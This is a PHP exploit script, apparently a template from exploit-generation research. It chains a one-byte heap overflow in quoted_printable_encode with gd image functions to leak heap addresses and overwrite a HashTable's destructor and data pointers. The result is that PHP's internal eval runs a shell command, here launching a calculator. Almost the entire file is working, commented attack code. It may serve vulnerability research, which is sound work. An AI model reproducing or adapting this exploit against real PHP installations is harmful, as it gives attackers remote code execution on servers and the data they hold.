<?php
#X-SHRIKE TEMPLATE-VERSION 2

$quote_str = str_repeat("\xf4", 123);
# Create a gdImage structure with a first element pointing to a buffer of size
# 16. The gdImage structure is of size 7360 and the arguments we provide will
# result in its first element being a buffer of size 16 (large enough to hold 2
# pointers to rows of pixels). 
#X-SHRIKE HEAP-MANIP 384
#X-SHRIKE RECORD-ALLOC 0 1
$image = imagecreate(1, 2);
# Allocate a buffer of size 3060 (rounded to 3072) and write a NULL byte past
# the end. This will result in the LSB of the first element of the gdImage
# structure getting zeroed out. As that allocation is of size 16, and as long as
# the LSB wasn't already 0x00, this will change the **pixels pointer to point to
# another allocation of size 16. Instead of pointing to an array of two pointers
# it will point to the contents of whatever buffer was allocated at the original
# address with the LSB nulled out. Even in 
#X-SHRIKE HEAP-MANIP 384
#X-SHRIKE RECORD-ALLOC 0 2
quoted_printable_encode($quote_str);

#X-SHRIKE REQUIRE-DISTANCE 1 2 384

printf("[-] Freeing in-use pointer container\n");
# Free the mblf_encoding container of size 16, which is the buffer that
# $image->pixels now refers to. 
mb_detect_order("auto");
printf("[-] Reallocating pointer container\n");
# Trigger two allocations of size 8 followed by two allocations of size 16. The
# first allocation of size 16 will be the row data for $new_image.  The row data
# for $new_image now overlaps with the row pointers of $image but they have been
# zeroed out as calloc is used to allocate the space.
$new_image = imagecreate(16, 1);
printf("[+] Pointer container reallocated as writable buffer\n");

printf("[-] Leaking addresses for chunks of size 56\n");
# Free the old image so we can reinitialize those zeroed out pointers.
$image = 0;
# Reallocate the old image reusing the freed container for the row pointers, but
# repopulating it. This undoes the damage done by calloc. The row buffers will
# be of size 56 and there will be four of them; two for im->pixels and two for
# im->AA_opacity. 
$image = imagecreate(56, 2);
# Leak both pointers. $new_image->pixels[0] will overlap with the AA_opacity
# buffer of $image, so the pointers we leak will be for its rows. 
$ptr0 = $ptr1 = 0;
for ($i = 0; $i < 8; $i++) {
	$ptr0 |= imagecolorat($new_image, $i, 0) << ($i * 8);
	$ptr1 |= imagecolorat($new_image, $i + 8, 0) << ($i * 8);
}
printf("[+] Leaked addresses: 0x%x, 0x%x\n", $ptr0, $ptr1);

printf("[-] Allocating a HashTable at 0x%x\n", $ptr1);
# Free the old image again, returning the chunks who's addresses we just leaked
# to the heap. As the pointers we leaked are for the AA_opacity buffer of
# $image, and they are free'd *after* the pixels buffer, ptr1 will be at the
# head of the free-list for size 56, with ptr0 next. 
$image = 0;
# We've just destroyed $image so $new_image->pixels[0] now overlaps with a free
# heap chunk. We must recreate $image and ensure that this chunk is used for
# $image->pixels. The first argument must be at least 8 as imagesetpixels checks
# that the x and y coordinates don't exceed the bounds of the images buffers,
# and we will later want to write 8 bytes to modify a stored pointer.
$image = imagecreate(8, 2); 
# Allocate a new HashTable. The rand() argument is necessary to prevent PHP
# lifting the call out to 'compile' time. It will use the buffer who's address
# we leaked as $ptr1
$ht = array(rand());
$ht_addr = $ptr1;
# Allocate a string. The total size allocated must be 56 so that it will reuse
# the buffer who's address we leaked as $ptr0.
$target_str = strtolower("`gnome-calculator`;AAAAA");
$zend_string_addr = $ptr0;
# HashTable's are zend_array structure's, are of size 56 and have their
# destructor pointer as the last element (+48). 
$ht_dtor_addr = $ht_addr + 48;
printf("[+] HashTable at 0x%x with destructor pointer at 0x%x\n", 
	$ptr1, $ht_dtor_addr);

printf("[-] Rewriting HashTable's destructor pointer\n");
for ($i = 0; $i < 8; $i++) {
	# Write the address we want to modify into the data buffer of
	# $new_image, which overlaps with the array of row pointers in $image.
	$b = ($ht_dtor_addr >> ($i * 8)) & 0xff;
	imagesetpixel($new_image, $i, 0, $b);
}
# Rewrite the destructor pointer
for ($i = 0; $i < 8; $i++) {
	imagesetpixel($image, $i, 0, 0x41 + $i);
}

# The arData pointer is provided as the argument when the destructor is called.
# zend_eval_string requires a char* with the string to eval as its first
# argument, so we can just rewrite arData to contain the address of the string
# we leaked above.
$zend_eval_string_addr = 0x95fd61;
for ($i = 0; $i < 8; $i++) {
	$b = ($zend_eval_string_addr >> ($i * 8)) & 0xff;
	imagesetpixel($image, $i, 0, $b);
}

# The arData pointer is at offset + 16. Rewrite it to be the address occupied by
# the string we allocated above + 24. The + 24 is necessary as there is a 24
# byte header on zend_strings before the char data.
$ht_arData_addr = $ht_addr + 16;
printf("[+] HashTable at 0x%x with arData pointer at 0x%x\n",
	$ptr1, $ht_arData_addr);

printf("[-] Rewriting HashTable's arData pointer\n");
for ($i = 0; $i < 8; $i++) {
	# Write the address we want to modify into the data buffer of
	# $new_image, which overlaps with the array of row pointers in $image.
	$b = ($ht_arData_addr >> ($i * 8)) & 0xff;
	imagesetpixel($new_image, $i, 0, $b);
}
# Rewrite the arData pointer
$target_str_addr = $zend_string_addr + 24;
for ($i = 0; $i < 8; $i++) {
	$b = ($target_str_addr >> ($i * 8)) & 0xff;
	imagesetpixel($image, $i, 0, $b);
}

printf("[!] Triggering destructor\n");
# Trigger destructor
$ht = 0;
?>
